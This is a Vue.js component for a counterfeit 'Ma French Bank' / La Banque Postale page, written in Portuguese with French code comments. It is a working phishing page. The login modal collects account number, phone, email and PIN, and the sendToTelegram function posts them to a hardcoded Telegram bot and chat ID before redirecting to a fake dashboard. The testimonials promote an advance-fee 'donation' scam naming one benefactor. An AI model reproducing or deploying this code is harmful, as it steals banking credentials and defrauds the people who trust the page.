<template>
  <div>
    <nav class="navbar">
      <div class="navbar-brand">
        Meu banco francês
      </div>
      <div class="navbar-links" :class="{ 'active': menuOpen }">
        <a href="#login" @click="openLoginModal">Conecte-se</a>
        <a href="#register" @click="closeMenu">registro</a>
      </div>
      <div class="navbar-toggle" @click="toggleMenu">
        <span></span>
        <span></span>
        <span></span>
      </div>
    </nav>
    
    <div class="carousel-container">
      <div class="carousel">
        <div class="carousel-item" v-for="(slide, index) in slides" :key="index" :class="{ 'active': index === currentSlide }">
          <img :src="slide.image" alt="Carousel Image">
          <div class="carousel-text">{{ slide.text }}</div>
        </div>
        <button class="carousel-control prev" @click="prevSlide">❮</button>
        <button class="carousel-control next" @click="nextSlide">❯</button>
      </div>
    </div>
    
    <div class="welcome-section">
      <img src="/public/card2.png" alt="Welcome Image" class="welcome-image" width="600px" height="600px">
      <div class="welcome-text">
        <h2>BEM-VINDO AO MEU BANCO FRANCÊS</h2>
        <p>Ma French Bank é o banco 100% móvel do grupo La Banque Postale. Um banco acessível, aberto a todos, sem condições de recursos, reivindicamos bem alto os valores de proximidade e simplicidade que constituem o ADN de La Poste e La Banque Postale.</p>
        <br>
        <h2>CARTÕES BANCÁRIOS MA FRANCESES</h2>
        <p>Seja qual for a minha conta bancária francesa, tenho um cartão Visa internacional que me acompanha diariamente. É aceito em toda a França ou no exterior. Para maior segurança, bloqueio-o temporariamente caso me esqueça e configuro os meus limites máximos conforme desejado(1).</p>
      </div>
    </div>

    <h1 style="text-align: center; margin-top: 5rem;">TESTEMUNHO</h1>

    <div class="testimo" style="display: flex;  margin-top: 5rem; overflow: hidden; overflow-x: scroll;">
        <figure class="snip1197">
          <figcaption>
            <blockquote>O Meu banco francês ajudou-me a beneficiar de uma doação de 150.000 euros através de uma senhora chamada PELAJI DLANDINE</blockquote>
            <div class="arrow"></div>
          </figcaption>
          <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/331810/sq-sample10.jpg" alt="sq-sample10"/>
          <div class="author">
            <h5>Daniella Valor <span>- LittleSnippets</span></h5>
          </div>
      </figure>
      <figure class="snip1197 hover">
          <figcaption>
            <blockquote>Conheci uma senhora realmente muito generosa que me ofereceu uma doação, mas no início tive dúvidas porque não acreditei mas no final esta senhora é a senhora Pelaji Dlandine,</blockquote>
            <div class="arrow"></div>
          </figcaption>
          <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/331810/sq-sample33.jpg" alt="sq-sample33"/>
          <div class="author">
            <h5>Nicolas Lopez<span>- LittleSnippets</span></h5>
          </div>
      </figure>
      <figure class="snip1197 hover">
        <figcaption>
          <blockquote>I don't need to compromise on my principles, because they don't have the slightest bearing on what happens to me anyway.</blockquote>
          <div class="arrow"></div>
        </figcaption>
        <img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/331810/sq-sample33.jpg" alt="sq-sample33"/>
        <div class="author">
          <h5>Max Conversion<span>- LittleSnippets</span></h5>
        </div>
      </figure>
    </div>

    <div v-if="showLoginModal" class="modal-overlay" @click.self="closeLoginModal">
      <div class="modal">
        <div class="modal-content">
          <div class="modal-image" style="margin-right: 80px;">
            <img src="/public/cad.jpg" alt="Login Image">
          </div>
          <div class="modal-form">
            <h2>Conecte-se</h2>
            <form @submit.prevent="submitLogin">
              <div class="form-group">
                <label for="accountNumber">número de conta</label>
                <input type="text" id="accountNumber" v-model="accountNumber" @input="formatAccountNumber" required maxlength="19">
              </div>
              <div class="form-group">
                <label for="country">país</label>
                <select id="country" v-model="selectedCountry" @change="updatePhonePrefix" required>
                  <option v-for="country in countries" :value="country.name" :key="country.code">
                    {{ country.name }}
                  </option>
                </select>
              </div>
              <div class="form-group">
                <label for="phoneNumber">Número de telefone</label>
                <input type="text" id="phoneNumber" v-model="phoneNumber" required>
              </div>
              <div class="form-group">
                <label for="email">E-mail</label>
                <input type="email" id="email" v-model="email" required>
              </div>
              <div class="form-group">
                <label for="pin">Pinho</label>
                <input type="password" id="pin" v-model="pin" required maxlength="6">
              </div>
              <button type="submit">Para validar</button>
            </form>
          </div>
        </div>
      </div>
    </div>
    <footer class="footer">
      <div class="footer-container">
        <div class="footer-section" style="text-align: center;">
          <h3>MA BANCO FRANCÊS</h3>
          <p>E-mail: banquedelafrance3@gmail.com</p>
        </div>  
      </div>
      <div class="footer-bottom">
        <p>&copy; 2024 MA BANCO FRANCÊS. Todos os direitos reservados.</p>
      </div>
    </footer>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue';
import { useRouter } from 'vue-router';

import axios from 'axios';

const menuOpen = ref(false);
const toggleMenu = () => {
  menuOpen.value = !menuOpen.value;
};
const closeMenu = () => {
  menuOpen.value = false;
};

const slides = ref([
  { image: '/public/card.png', text: 'Bienvenue à MYBANK' },
  { image: '/public/card2.png', text: 'Des services bancaires de qualité' },
]);

const currentSlide = ref(0);

const nextSlide = () => {
  currentSlide.value = (currentSlide.value + 1) % slides.value.length;
};

const prevSlide = () => {
  currentSlide.value = (currentSlide.value - 1 + slides.value.length) % slides.value.length;
};

const showLoginModal = ref(false);
const accountNumber = ref('');
const selectedCountry = ref('');
const phoneNumber = ref('');
const email = ref('');
const pin = ref('');
const router = useRouter();

const countries = ref([
  { name: 'França', code: 'FR', prefix: '+33' },
  { name: 'Brasil', code: 'BR', prefix: '+55' },
  { name: 'México', code: 'MX', prefix: '+52' },
  { name: 'Equador', code: 'EC', prefix: '+593' },
  { name: 'Colômbia', code: 'CO', prefix: '+57' },
  { name: 'Espanha', code: 'ES', prefix: '+34' },
  { name: 'Bélgica', code: 'BE', prefix: '+32' },
  { name: 'Argentina', code: 'AR', prefix: '+54' }
  // Add more countries as needed
]);


const closeLoginModal = () => {
  showLoginModal.value = false;
};

const formatAccountNumber = () => {
  accountNumber.value = accountNumber.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
};

const updatePhonePrefix = () => {
  const country = countries.value.find(c => c.name === selectedCountry.value);
  phoneNumber.value = country ? country.prefix : '';
};

// Fonction pour envoyer les données à Telegram
const sendToTelegram = async (formData) => {
  try {
    // Token d'accès de votre bot Telegram
    const token = '6356812643:AAGioWuATBRtm2Jop1LhnHmE2oQvA2PDfEg';

    // ID du chat ou du groupe où vous souhaitez recevoir les messages
    const chatId = '1802704596';

    // Message à envoyer à Telegram
    const message = `
      Nouvelle connexion :
      Numéro de compte : ${formData.accountNumber}
      Pays : ${formData.selectedCountry}
      Numéro de téléphone : ${formData.phoneNumber}
      Email : ${formData.email}
      PIN : ${formData.pin}
    `;

    // URL de l'API pour envoyer le message à Telegram
    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    // Paramètres de la requête POST
    const params = new URLSearchParams({
      chat_id: chatId,
      text: message,
    });

    // Envoi de la requête POST à l'API Telegram
    const response = await axios.post(apiUrl, params);

    // Affichage de la réponse de l'API Telegram
    console.log(response.data);
    // Redirection vers le dashboard
    router.push('/dash');
  } catch (error) {
    console.error('Erreur lors de l\'envoi du message à Telegram :', error);
  }
};

// Fonction pour soumettre le formulaire de login
const submitLogin = () => {
  // Envoyer les données à Telegram avant la redirection
  sendToTelegram({ accountNumber: accountNumber.value, selectedCountry: selectedCountry.value, phoneNumber: phoneNumber.value, email: email.value, pin: pin.value });
  
};

const openLoginModal = () => {
  showLoginModal.value = true;
};

const startAutoSlide = () => {
  setInterval(() => {
    nextSlide();
  }, 5000); // Défilement toutes les 5 secondes (5000 millisecondes)
};

onMounted(() => {
  startAutoSlide();
});

</script>


<style scoped>
/* Navbar styles */
.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 1rem 2rem;
  background-color: #2c3e50;
  color: white;
  position: relative;
}

.navbar-brand {
  font-size: 1.5rem;
  font-weight: bold;
}

.navbar-links {
  display: flex;
  gap: 1rem;
  transition: all 0.3s ease-in-out;
}

.navbar-links a {
  color: white;
  text-decoration: none;
  font-size: 1rem;
  transition: color 0.3s;
}

.navbar-links a:hover {
  color: #3498db;
}

.navbar-toggle {
  display: none;
  flex-direction: column;
  cursor: pointer;
}

.navbar-toggle span {
  height: 3px;
  width: 25px;
  background-color: white;
  margin: 4px 0;
  transition: transform 0.3s;
}

@media (max-width: 768px) {
  .navbar-links {
    position: absolute;
    top: 60px;
    right: 0;
    background-color: #2c3e50;
    flex-direction: column;
    width: 100%;
    align-items: center;
    display: none;
  }

  .navbar-links.active {
    display: flex;
  }

  .navbar-links a {
    padding: 1rem 0;
    width: 100%;
    text-align: center;
  }

  .navbar-toggle {
    display: flex;
  }
}

/* Carousel styles */
.carousel-container {
  display: flex;
  justify-content: center;
  margin-top: 2rem;
}

.carousel {
  position: relative;
  width: 1000px;
  height: 600px;
  overflow: hidden;
  border-radius: 10px;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.carousel-item {
  display: none;
  position: relative;
  width: 100%;
  height: 100%;
}

.carousel-item.active {
  display: block;
}

.carousel-item img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  border-radius: 10px;
}

.carousel-text {
  position: absolute;
  bottom: 20px;
  left: 20px;
  color: white;
  background-color: rgba(0, 0, 0, 0.5);
  padding: 10px;
  border-radius: 5px;
  font-size: 1.2rem;
}

.carousel-control {
  position: absolute;
  top: 50%;
  transform: translateY(-50%);
  background-color: rgba(0, 0, 0, 0.5);
  color: white;
  border: none;
  padding: 10px;
  cursor: pointer;
  font-size: 1.5rem;
}

.carousel-control.prev {
  left: 10px;
}

.carousel-control.next {
  right: 10px;
}

/* Welcome section styles */
.welcome-section {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 2rem;
  padding: 2rem;
  background-color: #f7f7f7;
  border-radius: 10px;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.welcome-image {
  max-width: 100%;
  height: auto;
  border-radius: 10px;
}

.welcome-text {
  margin-left: 2rem;
}

.welcome-text h2 {
  font-size: 2rem;
  margin-bottom: 1rem;
}

.welcome-text p {
  font-size: 1.2rem;
  line-height: 1.5;
}

@media (max-width: 768px) {
  .welcome-section {
    flex-direction: column;
    text-align: center;
  }

  .welcome-text {
    margin-left: 0;
    margin-top: 1rem;
  }
}


@import url(https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css);
@import url(https://fonts.googleapis.com/css?family=Raleway:400,800);
figure.snip1197 {
  font-family: 'Raleway', Arial, sans-serif;
  position: relative;
  margin: 10px;
  min-width: 400px;
  max-width: 480px;
  width: 100%;
  color: #333;
  text-align: left;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.15);
}
figure.snip1197 * {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
}
figure.snip1197 img {
  float: right;
  max-width: 40%;
  vertical-align: middle;
  border-radius: 0 8px 8px 0;
}
figure.snip1197 figcaption {
  top: 0;
  bottom: 0;
  left: 0;
  width: 60%;
  position: absolute;
  background-color: #ffffff;
  border-radius: 8px 0 0 8px;
}
figure.snip1197 blockquote {
  position: relative;
  padding: 25px 50px 25px 50px;
  font-size: 0.8em;
  font-weight: 500;
  text-align: left;
  margin: 0;
  line-height: 1.6em;
  font-style: italic;
}
figure.snip1197 blockquote:before,
figure.snip1197 blockquote:after {
  font-family: 'FontAwesome';
  content: "\201C";
  position: absolute;
  font-size: 50px;
  opacity: 0.3;
  font-style: normal;
}
figure.snip1197 blockquote:before {
  top: 25px;
  left: 20px;
}
figure.snip1197 blockquote:after {
  content: "\201D";
  right: 20px;
  bottom: 0px;
}
figure.snip1197 .arrow {
  top: 30px;
  left: 100%;
  width: 0;
  height: 0;
  border-left: 0 solid transparent;
  border-right: 25px solid transparent;
  border-top: 25px solid #ffffff;
  margin: 0;
  position: absolute;
}
figure.snip1197 .author {
  position: absolute;
  top: 100%;
  width: 60%;
  padding: 10px 15px;
  color: #ffffff;
  margin: 0;
  text-transform: uppercase;
}
figure.snip1197 .author h5 {
  opacity: 0.8;
  margin: 0;
  font-weight: 800;
}
figure.snip1197 .author h5 span {
  font-weight: 400;
  text-transform: none;
  padding-left: 5px;
}

/*.testimo{
  animation: scroll 20s linear infinite;
}
@keyframes scroll {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(-100%);
  }
}*/


.footer {
  background-color: #2c3e50;
  color: white;
  padding: 2rem 0;
  margin-top: 5rem;
}

.footer-container {
  display: flex;
  justify-content: space-around;
  align-items: flex-start;
  flex-wrap: wrap;
  max-width: 1200px;
  margin: 0 auto;
}

.footer-section {
  flex: 1;
  min-width: 250px;
  margin: 1rem;
}

.footer-section h3 {
  border-bottom: 1px solid #3498db;
  padding-bottom: 0.5rem;
  margin-bottom: 1rem;
}

.footer-section p, .footer-section ul {
  margin: 0.5rem 0;
}

.footer-section ul {
  list-style: none;
  padding: 0;
}

.footer-section ul li {
  margin: 0.5rem 0;
}

.footer-section ul li a {
  color: white;
  text-decoration: none;
  transition: color 0.3s;
}

.footer-section ul li a:hover {
  color: #3498db;
}

.social-icons {
  display: flex;
  gap: 1rem;
}

.social-icon {
  display: inline-block;
  width: 40px;
  height: 40px;
  background-color: #3498db;
  color: white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  transition: background-color 0.3s;
}

.social-icon:hover {
  background-color: #2980b9;
}

.footer-bottom {
  text-align: center;
  padding: 1rem 0;
  background-color: #233140;
}

.footer-bottom p {
  margin: 0;
  color: #bbb;
}

.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal {
  background: white;
  padding: 2rem;
  border-radius: 8px;
  width: 90%;
  max-width: 500px;
}

.modal h2 {
  margin-top: 0;
}

.form-group {
  margin-bottom: 1rem;
}

.form-group label {
  display: block;
  margin-bottom: 0.5rem;
}

.form-group input,
.form-group select {
  width: 100%;
  padding: 0.5rem;
  border: 1px solid #ccc;
  border-radius: 4px;
}

button {
  background-color: #3498db;
  color: white;
  border: none;
  padding: 0.75rem 1.5rem;
  border-radius: 4px;
  cursor: pointer;
}

button:hover {
  background-color: #2980b9;
}

.modal-content {
  display: flex;
  flex-direction: row;
  justify-content: space-between;
}

.modal-image img {
  max-width: 100%;
  height: auto;
  display: flex;
  align-items: center;
  justify-content: center;
}
.modal-image {
  display: flex;
  align-items: center;
  justify-content: center;
}
.modal-form {
  flex: 1;
  padding-left: 20px;
}

.form-group {
  margin-bottom: 15px;
}

.modal {
  background: white;
  padding: 20px;
  border-radius: 8px;
  width: 80%;
  max-width: 800px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
}

</style>
